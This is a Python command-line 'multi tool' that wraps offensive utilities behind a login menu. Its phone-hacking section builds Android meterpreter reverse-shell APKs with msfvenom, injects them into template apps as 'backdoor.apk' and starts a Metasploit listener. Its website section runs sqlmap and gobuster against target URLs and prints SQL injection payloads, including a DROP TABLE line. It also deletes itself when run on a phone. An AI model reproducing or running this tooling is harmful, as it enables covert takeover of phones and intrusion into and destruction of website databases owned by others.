#!/usr/bin/env python3
# ============================================================
# MAHIRU EDITZ - MULTI TOOL ULTIMATE
# BY DIZX FOR KING 👑😈
# VERSION: 6.0 | FULL FEATURES
# ============================================================

import os
import sys
import subprocess
import time
import socket
import json
import hashlib
import platform
import psutil
import shutil
import threading
import requests
from pathlib import Path

# ============================================================
# COLOR SYSTEM
# ============================================================

C = '\033[38;2;0;200;200m'
G = '\033[38;2;0;255;100m'
R = '\033[38;2;255;50;80m'
Y = '\033[38;2;255;200;0m'
W = '\033[38;2;220;220;220m'
D = '\033[38;2;100;100;120m'
X = '\033[0m'
B = '\033[1m'

# ============================================================
# VARIABLES & CONFIG
# ============================================================

CONFIG_FILE = os.path.expanduser("~/.mahiru_config.json")
CREDENTIALS_FILE = os.path.expanduser("~/.mahiru_credentials.json")
DEFAULT_USERNAME = "admin"
DEFAULT_PASSWORD = "dizx123"

# ============================================================
# SELF DESTRUCT
# ============================================================

def self_destruct():
    clear()
    print(f"\n  {R}╔════════════════════════════════════════════════════════╗{X}")
    print(f"  {R}║     SELF DESTRUCT ACTIVATED - PHONE DETECTED           ║{X}")
    print(f"  {R}╚════════════════════════════════════════════════════════╝{X}\n")
    
    for i in range(10):
        print(f"\r  {R}deleting files... {i*10}%{X}", end="")
        time.sleep(0.2)
    print()
    
    try:
        os.remove(os.path.abspath(sys.argv[0]))
    except:
        pass
    try:
        shutil.rmtree("/tmp/mahiru_temp", ignore_errors=True)
    except:
        pass
    try:
        if os.path.exists(CONFIG_FILE):
            os.remove(CONFIG_FILE)
        if os.path.exists(CREDENTIALS_FILE):
            os.remove(CREDENTIALS_FILE)
    except:
        pass
    
    print(f"\n  {R}Goodbye...{X}\n")
    sys.exit(0)

def is_phone():
    machine = platform.machine().lower()
    if machine in ['armv7l', 'aarch64', 'arm64', 'arm']:
        return True
    try:
        if os.path.exists("/system/app") and os.path.exists("/data/data"):
            return True
    except:
        pass
    return False

# ============================================================
# CONFIG MANAGEMENT
# ============================================================

def load_config():
    default = {"lhost": "192.168.1.100", "lport": "4444", "first_run": True}
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            return json.load(f)
    else:
        with open(CONFIG_FILE, "w") as f:
            json.dump(default, f, indent=4)
        return default

def save_config(config):
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=4)

def load_creds():
    default = {"username": DEFAULT_USERNAME, "password": hashlib.sha256(DEFAULT_PASSWORD.encode()).hexdigest()}
    if os.path.exists(CREDENTIALS_FILE):
        with open(CREDENTIALS_FILE, "r") as f:
            return json.load(f)
    else:
        with open(CREDENTIALS_FILE, "w") as f:
            json.dump(default, f, indent=4)
        return default

def save_creds(creds):
    with open(CREDENTIALS_FILE, "w") as f:
        json.dump(creds, f, indent=4)

def set_lhost_port():
    config = load_config()
    section("SET LHOST & LPORT")
    spacing()
    print(f"  {D}current: {config['lhost']}:{config['lport']}{X}")
    spacing()
    new_lhost = input(f"  {D}new lhost > {X}")
    new_lport = input(f"  {D}new lport > {X}")
    if new_lhost:
        config['lhost'] = new_lhost
    if new_lport:
        config['lport'] = new_lport
    save_config(config)
    print(f"\n  {status_icon('success')} saved: {config['lhost']}:{config['lport']}")
    spacing()
    line()
    press_enter()

# ============================================================
# SYSTEM CHECK
# ============================================================

def system_check():
    clear()
    print(f"\n  {C}Tools by mahiru editz{X}")
    line()
    print(f"\n  {D}── SYSTEM CHECK ──{X}\n")
    
    # OS
    print(f"  {C}▶{X}  {B}OPERATING SYSTEM{X}")
    print(f"  {D}  system{X}     {platform.system()} {platform.release()}")
    print(f"  {D}  machine{X}    {platform.machine()}")
    spacing()
    
    # CPU
    print(f"  {C}▶{X}  {B}PROCESSOR{X}")
    print(f"  {D}  cores{X}      {psutil.cpu_count(logical=True)} logical, {psutil.cpu_count(logical=False)} physical")
    print(f"  {D}  usage{X}      {psutil.cpu_percent(interval=1)}%")
    spacing()
    
    # RAM
    mem = psutil.virtual_memory()
    mem_total = mem.total / (1024**3)
    print(f"  {C}▶{X}  {B}MEMORY{X}")
    print(f"  {D}  total{X}      {mem_total:.1f} GB")
    print(f"  {D}  usage{X}      {mem.percent}%")
    if mem.percent > 80:
        print(f"  {Y}  ⚠ high memory usage{X}")
    spacing()
    
    # Storage
    disk = psutil.disk_usage('/')
    disk_total = disk.total / (1024**3)
    print(f"  {C}▶{X}  {B}STORAGE{X}")
    print(f"  {D}  total{X}      {disk_total:.1f} GB")
    print(f"  {D}  usage{X}      {disk.percent}%")
    spacing()
    
    # Network
    print(f"  {C}▶{X}  {B}NETWORK{X}")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        print(f"  {D}  local ip{X}    {C}{local_ip}{X}")
    except:
        print(f"  {D}  local ip{X}    {R}offline{X}")
    s.close()
    
    # Device
    print(f"  {C}▶{X}  {B}DEVICE{X}")
    try:
        with open("/sys/class/dmi/id/product_name", "r") as f:
            product = f.read().strip()
        if "HP Mini" in product:
            print(f"  {D}  model{X}       {G}{product} (OPTIMIZED){X}")
        else:
            print(f"  {D}  model{X}       {product}{X}")
    except:
        print(f"  {D}  model{X}       {D}unknown{X}")
    
    spacing()
    line()
    press_enter()

def quick_check():
    mem = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    mem_status = f"{G}✓{X}" if mem.percent < 80 else f"{Y}⚠{X}"
    disk_status = f"{G}✓{X}" if disk.percent < 85 else f"{Y}⚠{X}"
    print(f"  {D}ram{X}      {mem_status} {mem.percent}% ({mem.total/(1024**3):.0f}GB)")
    print(f"  {D}storage{X}  {disk_status} {disk.percent}%")

# ============================================================
# LOGIN SYSTEM
# ============================================================

def login():
    attempts = 0
    while attempts < 3:
        clear()
        print(f"\n  {C}Tools by mahiru editz{X}")
        line()
        print(f"\n  {D}── LOGIN ──{X}\n")
        
        username = input(f"  {D}username > {X}")
        password = input(f"  {D}password > {X}")
        
        creds = load_creds()
        hashed = hashlib.sha256(password.encode()).hexdigest()
        
        if username == creds["username"] and hashed == creds["password"]:
            print(f"\n  {status_icon('success')} {G}login successful{X}")
            time.sleep(1)
            return True
        else:
            attempts += 1
            print(f"\n  {status_icon('error')} {R}invalid credentials ({3-attempts} left){X}")
            time.sleep(1.5)
    return False

def change_password():
    section("CHANGE PASSWORD")
    spacing()
    creds = load_creds()
    old = input(f"  {D}old password > {X}")
    if hashlib.sha256(old.encode()).hexdigest() != creds["password"]:
        print(f"  {status_icon('error')} wrong password")
    else:
        new = input(f"  {D}new password > {X}")
        confirm = input(f"  {D}confirm > {X}")
        if new != confirm:
            print(f"  {status_icon('error')} not match")
        elif len(new) < 4:
            print(f"  {status_icon('error')} too short")
        else:
            creds["password"] = hashlib.sha256(new.encode()).hexdigest()
            save_creds(creds)
            print(f"  {status_icon('success')} password changed")
    spacing()
    line()
    press_enter()

# ============================================================
# UTILITIES
# ============================================================

def clear():
    os.system('clear')

def line(char="─", length=49):
    print(f"{D}{char * length}{X}")

def spacing():
    print()

def press_enter():
    print(f"\n  {D}press enter to continue{X}", end="")
    input()

def status_icon(status):
    if status == "success":
        return f"{G}●{X}"
    elif status == "error":
        return f"{R}●{X}"
    elif status == "warning":
        return f"{Y}●{X}"
    else:
        return f"{D}○{X}"

def progress_bar(current, total, label):
    percent = int(current / total * 100)
    width = 30
    filled = int(width * current / total)
    bar = f"{C}{'█' * filled}{D}{'░' * (width - filled)}{X}"
    sys.stdout.write(f"\r  {bar}  {percent}%  {label}")
    sys.stdout.flush()

def section(title):
    print(f"\n  {D}── {C}{title}{X} {D}──{X}")

# ============================================================
# UI MENU
# ============================================================

def header():
    clear()
    print(f"\n  {C}Tools by mahiru editz{X}")
    line()

def menu():
    config = load_config()
    print(f"\n  {C}01{X}  Scan IP {D}[nmap]{X}")
    print(f"  {C}02{X}  Hack cellphone {D}[metasploit jadx apktool]{X}")
    print(f"  {C}03{X}  Hack database website {D}[cloudflare bypass]{X}")
    print(f"  {C}04{X}  Enable tor")
    print(f"  {C}05{X}  Show my IP")
    print(f"  {C}06{X}  System check")
    print(f"  {C}07{X}  Check installation")
    print(f"  {C}08{X}  Set LHOST/LPORT {D}[{config['lhost']}:{config['lport']}]{X}")
    print(f"  {C}09{X}  Change password")
    print(f"  {C}00{X}  Exit")
    line()

def submenu(title, items):
    clear()
    print(f"\n  {C}Tools by mahiru editz{X}")
    line()
    print(f"\n  {C}▶{X}  {title}")
    line()
    for key, value, desc in items:
        if desc:
            print(f"  {C}{key}{X}  {value} {D}[{desc}]{X}")
        else:
            print(f"  {C}{key}{X}  {value}")
    print(f"  {C}00{X}  Back")
    line()

# ============================================================
# FEATURE: SCAN IP
# ============================================================

def scan_ip():
    section("SCAN IP")
    spacing()
    target = input(f"  {D}target > {X}")
    if not target:
        print(f"  {status_icon('error')} target required")
    else:
        print(f"\n  {D}scanning {target}...{X}\n")
        subprocess.run(["nmap", "-sV", "-sC", "-T4", target])
    spacing()
    line()
    press_enter()

# ============================================================
# FEATURE: SHOW IP
# ============================================================

def show_ip():
    section("SHOW MY IP")
    spacing()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        local = s.getsockname()[0]
        print(f"  {D}local{X}   {C}{local}{X}")
    except:
        print(f"  {D}local{X}   {R}failed{X}")
    s.close()
    try:
        public = subprocess.check_output(["curl", "-s", "ifconfig.me"], text=True).strip()
        print(f"  {D}public{X}  {C}{public}{X}")
    except:
        print(f"  {D}public{X}  {R}failed{X}")
    spacing()
    line()
    press_enter()

# ============================================================
# FEATURE: ENABLE TOR
# ============================================================

def enable_tor():
    section("ENABLE TOR")
    spacing()
    tor_check = subprocess.run(["which", "tor"], capture_output=True)
    if tor_check.returncode != 0:
        print(f"  {status_icon('warning')} installing tor...")
        subprocess.run(["sudo", "apt", "install", "-y", "tor"], stdout=subprocess.DEVNULL)
    print(f"  {status_icon('running')} starting tor...")
    subprocess.run(["sudo", "systemctl", "start", "tor"])
    time.sleep(2)
    status = subprocess.run(["systemctl", "is-active", "tor"], capture_output=True, text=True)
    if status.stdout.strip() == "active":
        print(f"  {status_icon('success')} tor active")
        print(f"  {D}proxy{X}  socks5://127.0.0.1:9050")
    else:
        print(f"  {status_icon('error')} tor failed")
    spacing()
    line()
    press_enter()

# ============================================================
# FEATURE: CHECK INSTALLATION
# ============================================================

def check_installation():
    section("CHECK INSTALLATION")
    spacing()
    tools = ["nmap", "msfvenom", "apktool", "jadx", "adb", "sqlmap", "gobuster", "tor"]
    for tool in tools:
        check = subprocess.run(["which", tool], capture_output=True)
        if check.returncode == 0:
            print(f"  {status_icon('success')} {tool}")
        else:
            print(f"  {status_icon('error')} {tool} {D}[not installed]{X}")
    spacing()
    line()
    press_enter()

# ============================================================
# SUBMENU: HACK CELLPHONE
# ============================================================

def submenu_hack_cellphone():
    items = [
        ("01", "Create payload", "msfvenom"),
        ("02", "Inject to APK", "manual injection"),
        ("03", "Decompile APK", "apktool/jadx"),
        ("04", "Start listener", "metasploit"),
        ("05", "Create backdoor", "apk template"),
        ("06", "Extract payload", "from existing apk"),
    ]
    
    while True:
        submenu("HACK CELLPHONE", items)
        choice = input(f"\n  {C}→{X} {D}select{X} > ")
        
        if choice == "01":
            config = load_config()
            section("CREATE PAYLOAD")
            spacing()
            use = input(f"  {D}use default config? (y/n) > {X}")
            if use.lower() == "y":
                ip, port = config['lhost'], config['lport']
            else:
                ip = input(f"  {D}lhost > {X}")
                port = input(f"  {D}lport > {X}") or "4444"
            out = input(f"  {D}output > {X}") or "payload.apk"
            print(f"\n  {D}generating...{X}")
            subprocess.run(["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={ip}", f"LPORT={port}", "-o", out])
            print(f"\n  {status_icon('success')} saved: {out}")
            press_enter()
            
        elif choice == "02":
            section("INJECT TO APK")
            spacing()
            apk = input(f"  {D}target apk > {X}")
            payload = input(f"  {D}payload path > {X}")
            if os.path.exists(apk) and os.path.exists(payload):
                subprocess.run(["unzip", "-q", payload, "-d", "temp_payload/"])
                print(f"  {status_icon('success')} ready, copy classes.dex to decompiled folder")
            else:
                print(f"  {status_icon('error')} file not found")
            press_enter()
            
        elif choice == "03":
            section("DECOMPILE APK")
            spacing()
            apk = input(f"  {D}target apk > {X}")
            if os.path.exists(apk):
                subprocess.run(["apktool", "d", apk, "-f", "-o", "decompiled/"])
                print(f"  {status_icon('success')} output: decompiled/")
            else:
                print(f"  {status_icon('error')} not found")
            press_enter()
            
        elif choice == "04":
            config = load_config()
            section("START LISTENER")
            spacing()
            use = input(f"  {D}use default config? (y/n) > {X}")
            if use.lower() == "y":
                ip, port = config['lhost'], config['lport']
            else:
                ip = input(f"  {D}lhost > {X}")
                port = input(f"  {D}lport > {X}") or "4444"
            handler = f"use exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset LHOST {ip}\nset LPORT {port}\nexploit -j"
            print(f"\n  {D}run in msfconsole:{X}\n{C}{handler}{X}")
            subprocess.run(["msfconsole", "-q", "-x", handler])
            press_enter()
            
        elif choice == "05":
            config = load_config()
            section("CREATE BACKDOOR")
            spacing()
            use = input(f"  {D}use default config? (y/n) > {X}")
            if use.lower() == "y":
                ip, port = config['lhost'], config['lport']
            else:
                ip = input(f"  {D}lhost > {X}")
                port = input(f"  {D}lport > {X}") or "4444"
            template = input(f"  {D}template apk (optional) > {X}")
            if template and os.path.exists(template):
                subprocess.run(["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={ip}", f"LPORT={port}", "-x", template, "-o", "backdoor.apk"])
            else:
                subprocess.run(["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={ip}", f"LPORT={port}", "-o", "backdoor.apk"])
            print(f"  {status_icon('success')} saved: backdoor.apk")
            press_enter()
            
        elif choice == "06":
            section("EXTRACT PAYLOAD")
            spacing()
            payload = input(f"  {D}payload apk > {X}")
            if os.path.exists(payload):
                subprocess.run(["unzip", "-q", payload, "-d", "extracted_payload/"])
                print(f"  {status_icon('success')} extracted to: extracted_payload/")
            else:
                print(f"  {status_icon('error')} not found")
            press_enter()
            
        elif choice == "00":
            break
        else:
            print(f"  {status_icon('error')} invalid")
            time.sleep(1)

# ============================================================
# SUBMENU: HACK DATABASE
# ============================================================

def submenu_hack_database():
    items = [
        ("01", "SQLMap + Cloudflare", "auto injection"),
        ("02", "Manual SQL injection", "payload list"),
        ("03", "Admin finder", "gobuster dir"),
        ("04", "Database scanner", "find tables"),
        ("05", "Dork generator", "google dorks"),
        ("06", "Subdomain scanner", "find subdomains"),
    ]
    
    while True:
        submenu("HACK DATABASE WEBSITE", items)
        choice = input(f"\n  {C}→{X} {D}select{X} > ")
        
        if choice == "01":
            section("SQLMAP + CLOUDFLARE")
            spacing()
            url = input(f"  {D}target url > {X}")
            if url:
                subprocess.run(["sqlmap", "-u", url, "--random-agent", "--batch", "--level=3"])
            press_enter()
            
        elif choice == "02":
            section("MANUAL SQL INJECTION")
            spacing()
            print(f"\n  {D}payloads:{X}\n")
            print(f"  {C}•{X}  ' OR '1'='1")
            print(f"  {C}•{X}  ' UNION SELECT null, version() --")
            print(f"  {C}•{X}  ' AND 1=1 --")
            print(f"  {C}•{X}  '; DROP TABLE users --")
            press_enter()
            
        elif choice == "03":
            section("ADMIN FINDER")
            spacing()
            url = input(f"  {D}target url > {X}")
            if url:
                wordlist = "/usr/share/wordlists/dirb/common.txt"
                if os.path.exists(wordlist):
                    subprocess.run(["gobuster", "dir", "-u", url, "-w", wordlist, "-t", "30"])
            press_enter()
            
        elif choice == "04":
            section("DATABASE SCANNER")
            spacing()
            url = input(f"  {D}target url > {X}")
            if url:
                subprocess.run(["sqlmap", "-u", url, "--dbs", "--batch"])
            press_enter()
            
        elif choice == "05":
            section("DORK GENERATOR")
            spacing()
            print(f"\n  {D}google dorks:{X}\n")
            print(f"  {C}•{X}  inurl:admin login")
            print(f"  {C}•{X}  intitle:index of /admin")
            print(f"  {C}•{X}  site:target.com ext:sql")
            press_enter()
            
        elif choice == "06":
            section("SUBDOMAIN SCANNER")
            spacing()
            domain = input(f"  {D}domain > {X}")
            if domain:
                subprocess.run(["sublist3r", "-d", domain])
            press_enter()
            
        elif choice == "00":
            break
        else:
            print(f"  {status_icon('error')} invalid")
            time.sleep(1)

# ============================================================
# MAIN PROGRAM
# ============================================================

def main():
    # First run detection
    if is_phone():
        self_destruct()
    
    config = load_config()
    
    if config.get("first_run", True):
        system_check()
        config["first_run"] = False
        save_config(config)
    else:
        clear()
        print(f"\n  {C}Tools by mahiru editz{X}")
        line()
        print(f"\n  {D}── QUICK CHECK ──{X}\n")
        quick_check()
        time.sleep(2)
    
    # Login
    if not login():
        sys.exit(0)
    
    # Main loop
    while True:
        header()
        menu()
        choice = input(f"\n  {C}→{X} {D}select{X} > ")
        
        if choice == "01":
            scan_ip()
        elif choice == "02":
            submenu_hack_cellphone()
        elif choice == "03":
            submenu_hack_database()
        elif choice == "04":
            enable_tor()
        elif choice == "05":
            show_ip()
        elif choice == "06":
            system_check()
        elif choice == "07":
            check_installation()
        elif choice == "08":
            set_lhost_port()
        elif choice == "09":
            change_password()
        elif choice == "00":
            print(f"\n  {D}exiting...{X}\n")
            sys.exit(0)
        else:
            print(f"\n  {status_icon('error')} invalid option")
            time.sleep(1)

if __name__ == "__main__":
    main()

